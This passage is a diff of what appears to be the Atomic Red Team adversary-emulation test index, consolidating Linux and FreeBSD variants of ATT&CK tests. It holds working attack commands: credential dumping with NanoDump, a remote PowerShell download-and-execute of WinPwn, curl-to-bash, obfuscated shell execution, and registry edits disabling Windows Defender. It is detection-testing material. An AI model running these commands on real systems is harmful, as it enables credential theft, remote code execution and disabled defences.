+appear benign because from a defender’s viewpoint it’s within the realm of normal activity.
+
+Upon successful execution, you should find the dump file in directory of your choice or ""%temp%\SilentProcessExit"" by default.
+",windows,,,"PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""#{output_folder}""
+",command_prompt,True,,"rmdir ""#{output_folder}"" /s /q >nul 2> nul
+",powershell,"dependencies.0.description: NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe)
+
+dependencies.0.prereq_command: if (Test-Path PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe) {exit 0} else {exit 1}
+
+dependencies.0.get_prereq_command: [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
+Invoke-WebRequest ""https://github.com/fortra/nanodump/blob/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe""
+
+","input_arguments.output_folder.description: Folder Path where resulting dump should be placed
+
+input_arguments.output_folder.type: path
+
+input_arguments.output_folder.default: %temp%\SilentProcessExit
+
+"
 T1003.002,OS Credential Dumping: Security Account Manager,"Registry dump of SAM, creds, and secrets",5c2571d0-1572-416d-9676-812e64ca9f44,"Local SAM (SAM & System), cached credentials (System & Security) and LSA secrets (System & Security) can be enumerated
 via three registry keys. Then processed locally using https://github.com/Neohapsis/creddump7
 
@@ -18706,21 +18693,22 @@ T1134.001,Access Token Manipulation: Token Impersonation/Theft,Launch NSudo Exec
 NSudo download observed after maldoc execution. NSudo is a system management tool for advanced users to launch programs with full privileges.",windows,,,"Start-Process ""#{nsudo_path}"" -Argument ""-U:T -P:E cmd""
 Start-Sleep -Second 5
 Stop-Process -Name ""cmd"" -force -erroraction silentlycontinue
-",powershell,,,,powershell,"dependencies.0.description: NSudo.bat must exist in the specified path #{nsudo_path}
+",powershell,,,,powershell,"dependencies.0.description: NSudoLG.exe must exist in the specified path #{nsudo_path}
 
 dependencies.0.prereq_command: if (Test-Path ""#{nsudo_path}"") {exit 0} else {exit 1}
 
 dependencies.0.get_prereq_command: New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
 Invoke-WebRequest -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip"" ""https://github.com/M2Team/NSudo/releases/download/8.2/NSudo_8.2_All_Components.zip""
 Expand-Archive -Path ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip"" -DestinationPath ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components"" -Force
-Rename-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe"" ""#{nsudo_path}""
+Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo Launcher\x64\NSudoLG.exe"" ""#{nsudo_path}""
 Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components.zip"" -Recurse -ErrorAction Ignore
+Remove-Item ""PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components"" -Recurse -ErrorAction Ignore
 
-","input_arguments.nsudo_path.description: Path to the NSudo bat file
+","input_arguments.nsudo_path.description: Path to the NSudoLG.exe file
 
 input_arguments.nsudo_path.type: path
 
-input_arguments.nsudo_path.default: PathToAtomicsFolder\..\ExternalPayloads\NSudo_8.2_All_Components\NSudo_Launcher\x64\NSudoLG.exe
+input_arguments.nsudo_path.default: PathToAtomicsFolder\T1134.001\bin\NSudoLG.exe
 
 "
 T1134.001,Access Token Manipulation: Token Impersonation/Theft,Bad Potato,9c6d799b-c111-4749-a42f-ec2f8cb51448,"https://github.com/BeichenDream/BadPotato
@@ -19370,7 +19358,8 @@ dependencies.0.get_prereq_command: (which pkg && pkg install -y lsof)||(which yu
 
 ",
 T1087.001,Account Discovery: Local Account,Show if a user account has ever logged in remotely,0f0b6a29-08c3-44ad-a30b-47fd996b2110,"Show if a user account has ever logged in remotely
-",linux,,,"lastlog > #{output_file}
+",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && cmd=""lastlogin"" || cmd=""lastlog"" 
+$cmd > #{output_file}
 cat #{output_file}
 ",sh,,,"rm -f #{output_file}
 ",sh,"dependencies.0.description: Check if lastlog command exists on the machine
@@ -19380,17 +19369,6 @@ dependencies.0.prereq_command: if [ -x ""$(command -v lastlog)"" ]; then exit 0;
 dependencies.0.get_prereq_command: sudo apt-get install login; exit 1;
 
 ","input_arguments.output_file.description: Path where captured results will be placed
-
-input_arguments.output_file.type: path
-
-input_arguments.output_file.default: /tmp/T1087.001.txt
-
-"
-T1087.001,Account Discovery: Local Account,Show if a user account has ever logged in remotely (freebsd),0f73418f-d680-4383-8a24-87bc97fe4e35,"Show if a user account has ever logged in remotely
-",linux,,,"lastlogin > #{output_file}
-cat #{output_file}
-",sh,,,"rm -f #{output_file}
-",,,"input_arguments.output_file.description: Path where captured results will be placed
 
 input_arguments.output_file.type: path
 
@@ -21489,7 +21467,6 @@ input_arguments.host.default: 192.168.1.1
 
 "
 T1046,Network Service Discovery,Port Scan Nmap,515942b0-a09f-4163-a7bb-22fefb6f185f,"Scan ports to check for listening ports with Nmap.
-
 Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.
 ",linux,macos,,"sudo nmap -sS #{network_range} -p #{port}
 telnet #{host} #{port}
@@ -21498,50 +21475,19 @@ nc -nv #{host} #{port}
 
 dependencies.0.prereq_command: if [ -x ""$(command -v nmap)"" ]; then exit 0; else exit 1; fi;
 
-dependencies.0.get_prereq_command: (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)
+dependencies.0.get_prereq_command: (which yum && yum -y install epel-release nmap)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y nmap)||(which pkg && pkg install -y nmap)
 
 dependencies.1.description: Check if nc command exists on the machine
 
 dependencies.1.prereq_command: if [ -x ""$(command -v nc)"" ]; then exit 0; else exit 1; fi;
 
-dependencies.1.get_prereq_command: (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)
+dependencies.1.get_prereq_command: (which yum && yum -y install epel-release nc)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y netcat)||(which pkg && pkg install -y netcat)
 
 dependencies.2.description: Check if telnet command exists on the machine
 
 dependencies.2.prereq_command: if [ -x ""$(command -v telnet)"" ]; then exit 0; else exit 1; fi;
 
 dependencies.2.get_prereq_command: (which yum && yum -y install epel-release telnet)||(which apt-get && DEBIAN_FRONTEND=noninteractive apt-get install -y telnet)
-
-","input_arguments.host.description: Host to scan.
-
-input_arguments.host.type: string
-
-input_arguments.host.default: 192.168.1.1
-
-input_arguments.port.description: Ports to scan.
-
-input_arguments.port.type: string
-
-input_arguments.port.default: 80
-
-input_arguments.network_range.description: Network Range to Scan.
-
-input_arguments.network_range.type: string
-
-input_arguments.network_range.default: 192.168.1.0/24
-
-"
-T1046,Network Service Discovery,Port Scan Nmap for FreeBSD,f03d59dc-0e3b-428a-baeb-3499552c7048,"Scan ports to check for listening ports with Nmap.
-
-Upon successful execution, sh will utilize nmap, telnet, and nc to contact a single or range of addresses on port 80 to determine if listening. Results will be via stdout.
-",linux,,,"nmap -sS #{network_range} -p #{port}
-telnet #{host} #{port}
-nc -nv #{host} #{port}
-",sh,True,,,sh,"dependencies.0.description: Check if nmap command exists on the machine
-
-dependencies.0.prereq_command: if [ -x ""$(command -v nmap)"" ]; then exit 0; else exit 1; fi;
-
-dependencies.0.get_prereq_command: (which pkg && pkg install -y nmap)
 
 ","input_arguments.host.description: Host to scan.
 
@@ -21885,36 +21831,18 @@ T1059.004,Command and Scripting Interpreter: Bash,Command line scripts,b04ed73c-
 ",linux,,,"for i in $(seq 1 5); do echo ""$i, Atomic Red Team was here!""; sleep 1; done
 ",sh,,,,,,
 T1059.004,Command and Scripting Interpreter: Bash,Obfuscated command line scripts,5bec4cc8-f41e-437b-b417-33ff60acf9af,"An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.
-",linux,,,"ART=$(echo -n ""id"" |base64 -w 0)
+",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && encodecmd=""b64encode -r -"" && decodecmd=""b64decode -r"" || encodecmd=""base64 -w 0"" && decodecmd=""base64 -d""
+ART=$(echo -n ""id"" | $encodecmd)
 echo ""\$ART=$ART""
-echo -n ""$ART"" |base64 -d |/bin/bash
-unset ART 
-",sh,False,,,,,
-T1059.004,Command and Scripting Interpreter: Bash,Obfuscated command line scripts (freebsd),5dc1d9dd-f396-4420-b985-32b1c4f79062,"An adversary may pre-compute the base64 representations of the terminal commands that they wish to execute in an attempt to avoid or frustrate detection. The following commands base64 encodes the text string id, then base64 decodes the string, then pipes it as a command to bash, which results in the id command being executed.
-",linux,,,"ART=$(echo -n ""id"" |b64encode -r -)
-echo ""\$ART=$ART""
-echo -n ""$ART"" |b64decode -r |/bin/sh
+echo -n ""$ART"" | $decodecmd |/bin/bash
 unset ART
 ",sh,False,,,,,
 T1059.004,Command and Scripting Interpreter: Bash,Change login shell,c7ac59cb-13cc-4622-81dc-6d2fee9bfac7,"An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/bash shell, changes the users shell to sh, then deletes the art user. 
-",linux,,,"useradd -s /bin/bash art
+",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && pw useradd art -g wheel -s /bin/csh || useradd -s /bin/bash art
 cat /etc/passwd |grep ^art
 chsh -s /bin/sh art
 cat /etc/passwd |grep ^art
-",bash,True,,"userdel art
-",,"dependencies.0.description: chsh - change login shell, must be installed
-
-dependencies.0.prereq_command: if [ -f /usr/bin/chsh ]; then echo ""exit 0""; else echo ""exit 1""; exit 1; fi
-
-dependencies.0.get_prereq_command: echo ""Automated installer not implemented yet, please install chsh manually""
-
-",
-T1059.004,Command and Scripting Interpreter: Bash,Change login shell (freebsd),33b68b9b-4988-4caf-9600-31b7bf04227c,"An adversary may want to use a different login shell. The chsh command changes the user login shell. The following test, creates an art user with a /bin/sh shell, changes the users shell to sh, then deletes the art user. 
-",linux,,,"pw useradd art -g wheel -s /bin/csh
-cat /etc/passwd |grep ^art
-chsh -s /bin/sh art
-cat /etc/passwd |grep ^art
-",sh,True,,"rmuser -y art
+",bash,True,,"[ ""$(uname)"" = 'FreeBSD' ] && rmuser -y art || userdel art
 ",,"dependencies.0.description: chsh - change login shell, must be installed
 
 dependencies.0.prereq_command: if [ -f /usr/bin/chsh ]; then echo ""exit 0""; else echo ""exit 1""; exit 1; fi
@@ -21924,48 +21852,19 @@ dependencies.0.get_prereq_command: echo ""Automated installer not implemented ye
 ",
 T1059.004,Command and Scripting Interpreter: Bash,Environment variable scripts,bdaebd56-368b-4970-a523-f905ff4a8a51,"An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/bash
 ",linux,,,"export ART='echo ""Atomic Red Team was here... T1059.004""'
-echo $ART |/bin/bash
-",bash,False,,"unset ART
-",,,
-T1059.004,Command and Scripting Interpreter: Bash,Environment variable scripts (freebsd),663b205d-2121-48a3-a6f9-8c9d4d87dfee,"An adversary may place scripts in an environment variable because they can't or don't wish to create script files on the host. The following test, in a bash shell, exports the ART variable containing an echo command, then pipes the variable to /bin/sh
-",linux,,,"export ART='echo ""Atomic Red Team was here... T1059.004""'
 echo $ART |/bin/sh
 ",sh,False,,"unset ART
 ",,,
 T1059.004,Command and Scripting Interpreter: Bash,Detecting pipe-to-shell,fca246a8-a585-4f28-a2df-6495973976a1,"An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
 ",linux,,,"cd /tmp
-curl -s #{remote_url}
-ls -la /tmp/art.txt
 curl -s #{remote_url} |bash
 ls -la /tmp/art.txt      
-",bash,False,,"rm /tmp/art.txt
-",bash,"dependencies.0.description: Check if running on a Debian based machine.
+",sh,False,,"rm /tmp/art.txt
+",bash,"dependencies.0.description: Check if curl is installed on the machine.
 
-dependencies.0.prereq_command: if grep -iq ""debian\|ubuntu\|kali\|mint"" /usr/lib/os-release; then echo ""Debian""; else echo ""NOT Debian""; exit 1; fi
-if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
+dependencies.0.prereq_command: if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
 
-dependencies.0.get_prereq_command: apt update && apt install -y curl
-
-","input_arguments.remote_url.description: url of remote payload
-
-input_arguments.remote_url.type: url
-
-input_arguments.remote_url.default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.004/src/pipe-to-shell.sh
-
-"
-T1059.004,Command and Scripting Interpreter: Bash,Detecting pipe-to-shell (freebsd),1a06b1ec-0cca-49db-a222-3ebb6ef25632,"An adversary may develop a useful utility or subvert the CI/CD pipe line of a legitimate utility developer, who requires or suggests installing their utility by piping a curl download directly into bash. Of-course this is a very bad idea. The adversary may also take advantage of this BLIND install method and selectively running extra commands in the install script for those who DO pipe to bash and not for those who DO NOT. This test uses curl to download the pipe-to-shell.sh script, the first time without piping it to bash and the second piping it into bash which executes the echo command.
-",linux,,,"cd /tmp
-curl -s #{remote_url}
-ls -la /tmp/art.txt
-curl -s #{remote_url} |bash
-ls -la /tmp/art.txt      
-",sh,False,,"rm /tmp/art.txt      
-",sh,"dependencies.0.description: Check if running on a Debian based machine.
-
-dependencies.0.prereq_command: if grep -iq ""FreeBSD"" /etc/os-release; then echo ""FreeBSD""; else echo ""NOT FreeBSD""; exit 1; fi
-if [ -x ""$(command -v curl)"" ]; then echo ""curl is installed""; else echo ""curl is NOT installed""; exit 1; fi
-
-dependencies.0.get_prereq_command: pkg update && pkg install -y curl
+dependencies.0.get_prereq_command: which apt && apt update && apt install -y curl || which pkg && pkg update && pkg install -y curl
 
 ","input_arguments.remote_url.description: url of remote payload
 
@@ -22543,7 +22442,7 @@ input_arguments.pid.type: string
 input_arguments.pid.default: (Start-Process calc.exe -PassThru).Id
 
 "
-T1055,Process Injection,Read-Write-Execute process Injection,49543237-25db-497b-90df-d0a0a6e8fe2c,"This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.
+T1055,Process Injection,Read-Write-Execute process Injection,0128e48e-8c1a-433a-a11a-a5387384f1e1,"This test exploited the vulnerability in legitimate PE formats where sections have RWX permission and enough space for shellcode.
 The RWX injection avoided the use of VirtualAlloc, WriteVirtualMemory, and ProtectVirtualMemory, thus evading detection mechanisms 
 that relied on API call sequences and heuristics. The RWX injection utilises API call sequences: LoadLibrary --> GetModuleInformation --> GetModuleHandleA --> RtlCopyMemory --> CreateThread.
 The injected shellcode will open a message box and a notepad.
@@ -22629,15 +22528,7 @@ T1036.006,Masquerading: Space after Filename,Space After Filename,b95ce2eb-a093-
 ",macos,linux,,"mkdir -p /tmp/atomic-test-T1036.006
 cd /tmp/atomic-test-T1036.006
 mkdir -p 'testdirwithspaceend '
-/usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null
-chmod +x 'testdirwithspaceend /init '
-'./testdirwithspaceend /init '
-",bash,,,rm -rf /tmp/atomic-test-T1036.006,,,
-T1036.006,Masquerading: Space after Filename,Space After Filename (FreeBSD),cfc1fbb5-caae-4f4c-bfa8-1b7c8b5cc4e8,"Space after filename.
-",linux,,,"mkdir -p /tmp/atomic-test-T1036.006
-cd /tmp/atomic-test-T1036.006
-mkdir -p 'testdirwithspaceend '
-/bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init ""      
+[ ""$(uname)"" = 'FreeBSD' ] && /bin/echo ""#\!/bin/sh"" > ""testdirwithspaceend /init "" && echo 'echo ""print(\""running T1035.006 with space after filename to masquerade init\"")"" | python3.9' >> ""testdirwithspaceend /init "" && echo ""exit"" >> ""testdirwithspaceend /init "" || /usr/bin/echo -e ""%d\na\n#!/usr/bin/perl\nprint \""running T1035.006 with space after filename to masquerade init\\n\"";\nqx/cp \/usr\/bin\/perl 'init  '/;\nqx/'.\/init  ' -e 'sleep 5'/;\n.\nwq\n"" | ed 'testdirwithspaceend /init ' >/dev/null
 chmod +x 'testdirwithspaceend /init '
 './testdirwithspaceend /init '
 ",sh,,,rm -rf /tmp/atomic-test-T1036.006,,,
@@ -22878,19 +22769,10 @@ T1078.003,Valid Accounts: Local Accounts,WinPwn - Loot local Credentials - Safet
 iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
 safedump -consoleoutput -noninteractive",powershell,True,,,,,
 T1078.003,Valid Accounts: Local Accounts,Create local account (Linux),02a91c34-8a5b-4bed-87af-501103eb5357,"An adversary may wish to create an account with admin privileges to work with. In this test we create a ""art"" user with the password art, switch to art, execute whoami, exit and delete the art user.
-",linux,,,"useradd --shell /bin/bash --create-home --password $(openssl passwd -1 art) art
-su art
-whoami
-exit
-",bash,True,,"userdel -r art 
-",,,
-T1078.003,Valid Accounts: Local Accounts,Create local account (FreeBSD),95158cc9-8f6d-4889-9531-9be3f7f095e0,"An adversary may wish to create an account with admin privileges to work with. In this test we create a ""art"" user with the password art, switch to art, execute whoami, exit and delete the art user.
-",linux,,,"pw useradd art -g wheel -s /bin/sh
-echo $(openssl passwd -1 art) | pw mod user testuser1 -h 0      
-su art
-whoami
-exit
-",sh,True,,"rmuser -y art
+",linux,,,"password=$(openssl passwd -1 art)
+([ ""$(uname)"" = 'Linux' ] && useradd --shell /bin/bash --create-home --password $password art) || (pw useradd art -g wheel -s /bin/sh && (echo $password | pw mod user testuser1 -h 0))
+su art -c ""whoami; exit""
+",bash,True,,"[ ""$(uname)"" = 'Linux' ] && userdel art -rf || rmuser -y art
 ",,,
 T1078.003,Valid Accounts: Local Accounts,Reactivate a locked/expired account (Linux),d2b95631-62d7-45a3-aaef-0972cea97931,"A system administrator may have locked and expired a user account rather than deleting it. ""the user is coming back, at some stage"" An adversary may reactivate a inactive account in an attempt to appear legitimate. 
 
@@ -23603,12 +23485,9 @@ input_arguments.output_file.type: path
 input_arguments.output_file.default: %temp%\service-list.txt
 
 "
-T1007,System Service Discovery,System Service Discovery - systemctl,f4b26bce-4c2c-46c0-bcc5-fce062d38bef,"Enumerates system service using systemctl
-",linux,,,"systemctl --type=service
+T1007,System Service Discovery,System Service Discovery - systemctl/service,f4b26bce-4c2c-46c0-bcc5-fce062d38bef,"Enumerates system service using systemctl/service
+",linux,,,"if [ ""$(uname)"" = 'FreeBSD' ]; then service -e; else systemctl --type=service; fi;
 ",bash,,,,,,
-T1007,System Service Discovery,System Service Discovery - service,b2e1c734-7336-40f9-b970-b04731cbaf8a,"Enumerates system service using service
-",linux,,,"service -e
-",sh,,,,,,
 T1543.004,Create or Modify System Process: Launch Daemon,Launch Daemon,03ab8df5-3a6b-4417-b6bd-bb7a5cfd74cf,"Utilize LaunchDaemon to launch `Hello World`
 ",macos,,,"sudo cp #{path_malicious_plist} /Library/LaunchDaemons/#{plist_filename}
 sudo launchctl load -w /Library/LaunchDaemons/#{plist_filename}
@@ -24712,10 +24591,8 @@ input_arguments.ftp_port.default: 21
 
 "
 T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Python3 http.server,3ea1f938-f80a-4305-9aa8-431bc4867313,"An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.
-",linux,,,"if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
-",sh,False,,,,,
-T1048.003,Exfiltration Over Alternative Protocol: Exfiltration Over Unencrypted/Obfuscated Non-C2 Protocol,Python3 http.server (freebsd),57a303a2-0bc6-400d-b144-4f3292920a0b,"An adversary may use the python3 standard library module http.server to exfiltrate data. This test checks if python3.9 is available and if so, creates a HTTP server on port 9090, captures the PID, sleeps for 10 seconds, then kills the PID and unsets the $PID variable.
-",linux,,,"if [ $(which python3.9) ]; then cd /tmp; python3.9 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
+",linux,,,"[ ""$(uname)"" = 'FreeBSD' ] && alias python3=python3.9
+if [ $(which python3) ]; then cd /tmp; python3 -m http.server 9090 & PID=$!; sleep 10; kill $PID; unset PID; fi
 ",sh,False,,,,,
 T1562.001,Impair Defenses: Disable or Modify Tools,Disable syslog,4ce786f8-e601-44b5-bfae-9ebb15a7d1c8,"Disables syslog collection
 ",linux,,,"#{flavor_command}
@@ -25257,6 +25134,82 @@ input_arguments.region.default: us-east-1
 T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Defender ATP on Linux/MacOS,40074085-dbc8-492b-90a3-11bcfc52fda8,"With root privileges, an adversary can disable real time protection. Note, this test assumes Defender is not in passive mode and real-time protection is enabled. The use of a managed.json on Linux or Defender .plist on MacOS will prevent these changes. Tamper protection will also prevent this (available on MacOS, but not Linux at the time of writing). Installation of MDATP is a prerequisite. Installation steps vary across MacOS and Linux distros. See Microsoft public documentation for instructions: https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/mac-install-manually?view=o365-worldwide https://learn.microsoft.com/en-us/microsoft-365/security/defender-endpoint/linux-install-manually?view=o365-worldwide
 ",linux,macos,,"sudo mdatp config real-time-protection --value disabled
 ",sh,True,,"sudo mdatp config real-time-protection --value enabled
+",,,
+T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Registry - Reg.exe,1f6743da-6ecc-4a93-b03f-dc357e4b313f,"Disable Windows Defender by tampering with windows defender registry using the utility ""reg.exe""
+",windows,,,"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIntrusionPreventionSystem"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScriptScanning"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""1"" /f >NUL 2>nul 
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\SOFTWARE\Microsoft\Windows Defender\Features"" /v ""TamperProtection""  /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+",command_prompt,True,,"reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiSpyware"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender"" /v ""DisableAntiVirus"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableBehaviorMonitoring"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIntrusionPreventionSystem"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableIOAVProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableOnAccessProtection"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRealtimeMonitoring"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableRoutinelyTakingAction"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScanOnRealtimeEnable"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" /v ""DisableScriptScanning"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\Reporting"" /v ""DisableEnhancedNotifications"" /t REG_DWORD /d ""0"" /f >NUL 2>nul 
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""DisableBlockAtFirstSeen"" /t REG_DWORD /d ""0"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\SpyNet"" /v ""SpynetReporting"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender\MpEngine"" /v ""MpEnablePus"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Policies\Microsoft\Windows Defender Security Center\App and Browser protection"" /v ""DisallowExploitProtectionOverride"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Microsoft\Windows Defender\Features"" /v ""TamperProtection""  /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\software\microsoft\windows defender\spynet"" /v ""SubmitSamplesConsent"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+reg add ""HKLM\Software\Microsoft\Windows Defender"" /v ""PUAProtection"" /t REG_DWORD /d ""1"" /f >NUL 2>nul
+",,,
+T1562.001,Impair Defenses: Disable or Modify Tools,Tamper with Windows Defender Registry - Powershell,a72cfef8-d252-48b3-b292-635d332625c3,"Disable Windows Defender by tampering with windows defender registry through powershell
+",windows,,,"Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiSpyware"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender"" -Name ""DisableAntiVirus"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableBehaviorMonitoring"" -Value 1 
+Set-ItemProperty ""HKLM:\Software\Policies\Microsoft\Windows Defender\Real-Time Protection"" -Name ""DisableIntrusionPreventionSystem"" -Value 1 
